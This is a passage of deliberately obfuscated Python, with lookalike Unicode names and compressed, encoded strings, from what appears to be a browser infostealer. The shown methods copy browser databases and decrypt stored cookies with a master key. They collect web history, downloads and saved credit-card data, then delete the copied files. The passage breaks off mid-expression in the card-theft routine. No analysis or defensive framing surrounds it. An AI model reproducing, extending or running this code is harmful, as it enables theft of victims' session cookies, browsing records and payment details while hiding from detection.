        𝗰𝘰𝘯𝙣 = 𝘴𝙦𝗹𝗶𝘁𝗲3.connect(__𝗶𝘮𝙥𝗼𝙧𝙩__('base64').b64decode(__𝙞𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9I6\xb4\xcc\x8eL\xb7\xb5\x05\x00+\x8c\x05\x18')).decode())
        𝘀𝙚𝘁𝙖𝙩𝙩𝗿(𝗰𝗼𝗻𝙣, 'text_factory', 𝙗𝙮𝙩𝗲𝘴)
        𝙘𝙪𝙧𝘴𝙤𝙧 = 𝗰𝙤𝙣𝙣.cursor()
        𝙘𝘂𝙧𝙨𝙤𝗿.execute(__𝙞𝙢𝙥𝗼𝙧𝘁__('base64').b64decode(__𝘪𝙢𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5t\xcf(K6\x0eJK4\n3\xf5qv*\x8d\x0c7\xcc\x01\xd2\xe5\x91\x11A\xf9@:\')\xd7\xaf25\xc2\xc9 *<(-%\xd7\xad8%<\xb48*"\xa3<1\xc2+\'\xd9\xd0\xd20\xc5\xdd7=(\xc7+ $\xd8)+\xc9\xc8\xb2(1<\xac\n\x00\x84\xd0\x1e\xe1')).decode())
        for 𝙧𝙤𝙬 in 𝙘𝙪𝙧𝘴𝗼𝘳.fetchall():
            if not 𝙧𝘰𝙬[𝙞𝘯𝘁.from_bytes(𝙢𝘢𝙥(lambda O, i: 564 - (𝙞𝘯𝘵(𝘖) + 𝙞), 𝗺𝙖𝙥(__𝗶𝘮𝘱𝙤𝗿𝘁__('base64').b64decode(__𝘪𝘮𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝙞𝙩𝘦𝙧(__𝙞𝙢𝙥𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝘯𝙜𝗲(0)), __𝘪𝘮𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝘳𝙤𝘸[𝙞𝗻𝘵.from_bytes(𝗺𝙖𝙥(lambda O, i: 341 - (𝙞𝘯𝙩(𝘖) + 𝘪), 𝙢𝘢𝙥(__𝘪𝘮𝙥𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝘪𝙩𝙚𝘳(__𝘪𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xad\n,\x07\x00\x03\xbf\x01\x90')).decode())] * 3)), 𝙧𝗮𝗻𝙜𝙚(1)), __𝗶𝙢𝙥𝙤𝗿𝘁__('base64').b64decode(__𝘪𝘮𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝙧𝙤𝙬[𝙞𝙣𝘁.from_bytes(𝙢𝗮𝙥(lambda O, i: 823 - (𝘪𝗻𝘁(𝙊) + 𝘪), 𝙢𝘢𝗽(__𝘪𝙢𝗽𝙤𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝙞𝙩𝗲𝘳(__𝗶𝙢𝙥𝗼𝙧𝙩__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3w\xf1\xac\x00\x00\x03\x16\x01U')).decode())] * 3)), 𝘳𝗮𝘯𝗴𝙚(1)), __𝘪𝙢𝘱𝙤𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝙧𝙤𝙬[𝙞𝗻𝘵.from_bytes(𝙢𝘢𝘱(lambda O, i: 763 - (𝗶𝗻𝙩(𝙊) + 𝘪), 𝘮𝙖𝙥(__𝗶𝗺𝙥𝙤𝙧𝙩__('base64').b64decode(__𝙞𝙢𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝗶𝘵𝙚𝙧(__𝗶𝙢𝘱𝗼𝘳𝙩__('base64').b64decode(__𝘪𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xab\x8a,\x07\x00\x03\xd3\x01\x99')).decode())] * 3)), 𝘳𝗮𝙣𝘨𝘦(1)), __𝙞𝘮𝙥𝘰𝘳𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝘤𝗼𝙤𝘬𝙞𝙚 = 𝙨𝙚𝗹𝙛.decrypt_password(𝘳𝘰𝘸[𝙞𝙣𝘁.from_bytes(𝙢𝘢𝘱(lambda O, i: 640 - (𝘪𝙣𝘁(𝙊) + 𝗶), 𝘮𝗮𝙥(__𝙞𝗺𝗽𝙤𝘳𝘵__('base64').b64decode(__𝘪𝘮𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝘪𝙩𝙚𝘳(__𝗶𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝘪𝘮𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xcb\xf25\x06\x00\x03G\x019')).decode())] * 3)), 𝙧𝘢𝗻𝘨𝘦(1)), __𝗶𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝙞𝗺𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘴𝘦𝗹𝘧.master_key)
            𝗿𝘰𝙬 = [𝙭.decode(__𝙞𝙢𝘱𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKrw3H\x0c7)\xf1\r\xb4\xb5\x05\x00\x17\xe0\x03\x98')).decode()) if 𝗶𝘴𝗶𝗻𝘴𝘁𝗮𝙣𝙘𝘦(𝘹, 𝗯𝘺𝙩𝘦𝙨) else 𝘅 for 𝙭 in 𝗿𝘰𝙬]
            __𝗖𝘖𝙊𝙆𝙄𝘌𝘚__.append(𝙏𝘺𝙥𝘦𝘴.Cookie(𝗿𝙤𝘄[𝘪𝙣𝘁.from_bytes(𝗺𝗮𝘱(lambda O, i: 465 - (𝗶𝙣𝘁(𝘖) + 𝙞), 𝘮𝘢𝙥(__𝗶𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝘪𝘁𝘦𝘳(__𝘪𝘮𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝗮𝙣𝘨𝘦(0)), __𝙞𝘮𝙥𝙤𝙧𝘁__('base64').b64decode(__𝙞𝘮𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝘰𝘄[𝗶𝙣𝘵.from_bytes(𝙢𝙖𝗽(lambda O, i: 818 - (𝗶𝙣𝘁(𝗢) + 𝘪), 𝘮𝙖𝗽(__𝘪𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝗶𝗺𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝙞𝘵𝘦𝘳(__𝗶𝗺𝙥𝙤𝗿𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3wq5\x06\x00\x02\xc9\x01\x0c')).decode())] * 3)), 𝘳𝗮𝘯𝗴𝗲(1)), __𝙞𝗺𝘱𝘰𝘳𝘵__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝘰𝙬[𝗶𝘯𝘁.from_bytes(𝙢𝙖𝘱(lambda O, i: 711 - (𝗶𝗻𝙩(𝙊) + 𝙞), 𝙢𝗮𝙥(__𝗶𝘮𝗽𝗼𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝘪𝘵𝗲𝘳(__𝗶𝙢𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xabr4\x05\x00\x03a\x01?')).decode())] * 3)), 𝘳𝘢𝘯𝘨𝗲(1)), __𝘪𝘮𝗽𝙤𝙧𝙩__('base64').b64decode(__𝙞𝘮𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘤𝘰𝘰𝙠𝙞𝗲, 𝙧𝘰𝘸[𝙞𝙣𝘵.from_bytes(𝗺𝗮𝘱(lambda O, i: 550 - (𝙞𝘯𝘁(𝗢) + 𝘪), 𝘮𝘢𝘱(__𝗶𝙢𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝙞𝘵𝗲𝘳(__𝗶𝙢𝗽𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf3\x0b\t4\x02\x00\x03\x0c\x01&')).decode())] * 3)), 𝗿𝙖𝗻𝘨𝗲(1)), __𝙞𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝗰𝘂𝘳𝘴𝙤𝘳.close()
        𝗰𝘰𝗻𝙣.close()
        𝘰𝘴.remove(__𝘪𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝘪𝙢𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9I6\xb4\xcc\x8eL\xb7\xb5\x05\x00+\x8c\x05\x18')).decode())

    def get_web_history(self, path):
        𝗵𝘪𝘀𝘵𝘰𝘳𝘺_𝘥𝙗 = __𝙞𝘮𝘱𝗼𝘳𝘁__('base64').b64decode(__𝗶𝘮𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xdaK56L\x0ev\xcf\xa9Jq\xb7\xacL\r\xb4\xb5\x05\x00,\x87\x05:')).decode().format(𝙥𝙖𝘁𝗵)
        if not 𝗼𝘀.path.exists(𝗵𝗶𝙨𝘵𝗼𝗿𝘆_𝘥𝙗):
            return
        𝘀𝘩𝘂𝘵𝗶𝙡.copy(𝗵𝙞𝙨𝘁𝙤𝗿𝙮_𝙙𝗯, __𝘪𝘮𝙥𝘰𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKt\xcf\xa9Jq\xb7\xacL\r\xb3\xcc\x8eL\xb7\xb5\x05\x000\xda\x05\x85')).decode())
        𝙘𝗼𝙣𝙣 = 𝘴𝘲𝘭𝙞𝙩𝙚3.connect(__𝙞𝗺𝘱𝙤𝙧𝙩__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKt\xcf\xa9Jq\xb7\xacL\r\xb3\xcc\x8eL\xb7\xb5\x05\x000\xda\x05\x85')).decode())
        𝗰𝘶𝙧𝘴𝙤𝘳 = 𝘤𝗼𝘯𝗻.cursor()
        𝗰𝙪𝗿𝘴𝘰𝗿.execute(__𝙞𝗺𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝙢𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xabLr.OOq\xcf1Hr\x0f-\xf6t\xaf\xc8H6\x0eJK\xc9\xcd\xa9J\x8c\x00\xd2\xee9%Q\xc1N\xee\xa1\xd9\x96~`\xb5\x1e\xbe\xb6\x00q\xa2\x14\x90')).decode())
        for 𝙧𝙤𝙬 in 𝗰𝙪𝗿𝙨𝙤𝘳.fetchall():
            if not 𝗿𝘰𝙬[𝗶𝙣𝙩.from_bytes(𝗺𝘢𝘱(lambda O, i: 924 - (𝗶𝗻𝘁(𝗢) + 𝘪), 𝗺𝘢𝘱(__𝗶𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝘮𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝙞𝘁𝙚𝘳(__𝘪𝗺𝙥𝘰𝙧𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝗮𝘯𝗴𝗲(0)), __𝗶𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝙧𝘰𝘸[𝙞𝗻𝙩.from_bytes(𝗺𝗮𝗽(lambda O, i: 502 - (𝗶𝙣𝘁(𝗢) + 𝘪), 𝙢𝙖𝘱(__𝘪𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝘪𝘁𝗲𝙧(__𝙞𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝘮𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3\x0bq\xac\x00\x00\x032\x01\\')).decode())] * 3)), 𝘳𝘢𝘯𝘨𝘦(1)), __𝙞𝘮𝘱𝙤𝘳𝘵__('base64').b64decode(__𝘪𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝙧𝗼𝙬[𝙞𝗻𝘁.from_bytes(𝙢𝗮𝘱(lambda O, i: 945 - (𝘪𝘯𝘵(𝗢) + 𝙞), 𝗺𝗮𝗽(__𝙞𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝘪𝙢𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝗶𝘁𝗲𝘳(__𝗶𝙢𝘱𝙤𝙧𝙩__('base64').b64decode(__𝘪𝗺𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3\x0f\t\xac\x02\x00\x03X\x01o')).decode())] * 3)), 𝘳𝙖𝗻𝙜𝘦(1)), __𝘪𝙢𝙥𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            __𝘞𝘌𝗕_𝗛𝙄𝗦𝙏𝗢𝙍𝙔__.append(𝗧𝙮𝗽𝙚𝘀.WebHistory(𝘳𝘰𝘸[𝗶𝙣𝘵.from_bytes(𝙢𝙖𝙥(lambda O, i: 756 - (𝗶𝘯𝘵(𝙊) + 𝙞), 𝗺𝙖𝘱(__𝗶𝗺𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝙢𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝗶𝘁𝗲𝘳(__𝗶𝙢𝘱𝗼𝙧𝘁__('base64').b64decode(__𝘪𝙢𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝙖𝘯𝘨𝙚(0)), __𝘪𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝘰𝘸[𝗶𝗻𝘵.from_bytes(𝙢𝙖𝘱(lambda O, i: 745 - (𝙞𝗻𝘁(𝗢) + 𝗶), 𝙢𝙖𝗽(__𝘪𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝙢𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝙞𝘁𝘦𝙧(__𝗶𝙢𝙥𝘰𝙧𝘵__('base64').b64decode(__𝗶𝙢𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xab\n4\x00\x00\x03|\x01J')).decode())] * 3)), 𝗿𝙖𝙣𝙜𝘦(1)), __𝙞𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝘰𝙬[𝗶𝘯𝙩.from_bytes(𝘮𝗮𝗽(lambda O, i: 486 - (𝘪𝗻𝘵(𝙊) + 𝘪), 𝗺𝗮𝘱(__𝗶𝙢𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝙢𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝗶𝙩𝗲𝗿(__𝗶𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝙢𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3sI7\x00\x00\x03\x06\x01*')).decode())] * 3)), 𝗿𝘢𝙣𝘨𝗲(1)), __𝙞𝗺𝗽𝙤𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝗰𝙪𝗿𝘀𝘰𝙧.close()
        𝗰𝗼𝗻𝙣.close()
        𝙤𝘀.remove(__𝙞𝙢𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKt\xcf\xa9Jq\xb7\xacL\r\xb3\xcc\x8eL\xb7\xb5\x05\x000\xda\x05\x85')).decode())

    def get_downloads(self, path):
        𝘥𝘰𝘸𝙣𝙡𝗼𝘢𝙙𝙨_𝘥𝙗 = __𝙞𝗺𝘱𝗼𝗿𝘵__('base64').b64decode(__𝙞𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK56L\x0ev\xcf\xa9Jq\xb7\xacL\r\xb4\xb5\x05\x00,\x87\x05:')).decode().format(𝘱𝘢𝙩𝙝)
        if not 𝗼𝘀.path.exists(𝘥𝗼𝘸𝘯𝘭𝗼𝗮𝙙𝘀_𝗱𝙗):
            return
        𝙨𝘩𝙪𝘁𝘪𝙡.copy(𝘥𝙤𝘄𝙣𝗹𝗼𝘢𝙙𝘴_𝘥𝘣, __𝗶𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝗰𝙤𝘯𝗻 = 𝘴𝙦𝗹𝙞𝙩𝗲3.connect(__𝙞𝘮𝗽𝘰𝙧𝘁__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝙘𝘂𝗿𝘀𝗼𝗿 = 𝘤𝘰𝗻𝗻.cursor()
        𝙘𝙪𝘳𝙨𝙤𝘳.execute(__𝘪𝘮𝗽𝙤𝙧𝙩__('base64').b64decode(__𝘪𝘮𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xca\x88\xcc\xb14L\xce-/\x06\xb1\x93sSrR\xdc,\xcb##\x82\xf2=]\xa3\x82C\x0c\x0c\xd2\xa3\xdc-\x8d\x93r+\xca"\xc3\x83\xaa\x00\x13\xf6\x12\xfa')).decode())
        for 𝗿𝘰𝘸 in 𝗰𝘶𝙧𝘀𝗼𝗿.fetchall():
            if not 𝘳𝗼𝙬[𝙞𝙣𝘵.from_bytes(𝗺𝙖𝗽(lambda O, i: 807 - (𝗶𝙣𝙩(𝙊) + 𝗶), 𝘮𝘢𝘱(__𝗶𝙢𝗽𝗼𝙧𝘁__('base64').b64decode(__𝘪𝘮𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝗶𝘁𝙚𝗿(__𝙞𝙢𝗽𝙤𝘳𝘵__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝙖𝗻𝙜𝘦(0)), __𝗶𝘮𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝘰𝙬[𝙞𝘯𝘵.from_bytes(𝙢𝙖𝗽(lambda O, i: 894 - (𝗶𝘯𝘵(𝗢) + 𝗶), 𝘮𝗮𝘱(__𝗶𝘮𝙥𝗼𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝗶𝘵𝘦𝘳(__𝙞𝗺𝘱𝙤𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3w\xc9\xae\x02\x00\x03\\\x01y')).decode())] * 3)), 𝙧𝘢𝘯𝗴𝘦(1)), __𝘪𝘮𝙥𝙤𝙧𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]:
                continue
            __𝘿𝗢𝘞𝗡𝘓𝗢𝗔𝗗𝘚__.append(𝘛𝙮𝘱𝗲𝙨.Download(𝘳𝗼𝘄[𝗶𝙣𝙩.from_bytes(𝙢𝘢𝗽(lambda O, i: 332 - (𝙞𝗻𝘵(𝘖) + 𝘪), 𝗺𝘢𝗽(__𝙞𝘮𝙥𝗼𝘳𝘁__('base64').b64decode(__𝘪𝙢𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝘪𝘁𝙚𝘳(__𝗶𝙢𝙥𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝘢𝙣𝘨𝗲(0)), __𝘪𝗺𝘱𝘰𝘳𝙩__('base64').b64decode(__𝘪𝗺𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝗼𝘸[𝗶𝙣𝘁.from_bytes(𝙢𝘢𝗽(lambda O, i: 617 - (𝘪𝗻𝘵(𝘖) + 𝘪), 𝗺𝘢𝗽(__𝙞𝗺𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝘪𝘁𝗲𝗿(__𝘪𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xcbr5\x02\x00\x036\x010')).decode())] * 3)), 𝘳𝘢𝙣𝙜𝙚(1)), __𝘪𝙢𝗽𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝙘𝙪𝙧𝘀𝙤𝘳.close()
        𝘤𝘰𝘯𝘯.close()
        𝗼𝘴.remove(__𝘪𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝘮𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())

    def get_credit_cards(self, path):
        𝙘𝗮𝘳𝗱𝘴_𝗱𝘣 = __𝙞𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝗶𝙢𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK56L\x0e3\n\xcb\xf4t\r\xcaHqw\xb5\x05\x00)\x98\x04\xe9')).decode().format(𝗽𝗮𝘁𝙝)
        if not 𝙤𝘴.path.exists(𝗰𝗮𝘳𝗱𝘴_𝗱𝙗):
            return
        𝘴𝗵𝙪𝘵𝗶𝙡.copy(𝘤𝘢𝘳𝘥𝘴_𝙙𝗯, __𝗶𝘮𝘱𝙤𝗿𝙩__('base64').b64decode(__𝙞𝘮𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝗰𝘰𝙣𝘯 = 𝙨𝗾𝘭𝘪𝘁𝘦3.connect(__𝙞𝙢𝙥𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝙘𝙪𝙧𝙨𝗼𝙧 = 𝘤𝗼𝙣𝘯.cursor()
        𝙘𝙪𝙧𝙨𝗼𝙧.execute(__𝙞𝗺𝘱𝘰𝙧𝘵__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xdae\x8dA\x0b\xc2 \x18\x86\xff\x92\t\x1e<t\xd9`6i\xa3,\xf5\x9b7]\xdbd~\x83\xa0h\xf8\xef\x13:v}\xde\x87\xf7\xd1\xc4tJ\xf7\xba\x15,\x06k\xe6@\xd9<\xd0&\xbbz_\x1c\xc4\xdd\x83\x8c\x0f\x81\x9f\x80\xfc]6\xe2\xff9s\xb6\xc9\xe7\xbaZ\x07\x90\t(;\x04+qD\x8ea\xeb\xf3\x04\x15q\xf6\xfaj\x85*~\xf9\xb7<y\xeb\x9e\x85-\n\xe5\xe5~\xab\xd6q3\xc9\x83\xfauO\xdd\xf1\x0b\xa1_2\x87')).decode())
        for 𝗿𝘰𝘄 in 𝗰𝙪𝙧𝘴𝙤𝗿.fetchall():
            if not 𝙧𝗼𝘄[𝙞𝘯𝘵.from_bytes(𝘮𝘢𝗽(lambda O, i: 700 - (𝗶𝘯𝘵(𝘖) + 𝙞), 𝗺𝘢𝘱(__𝙞𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝘪𝘁𝙚𝗿(__𝘪𝘮𝘱𝘰𝘳𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝗻𝗴𝙚(0)), __𝘪𝙢𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 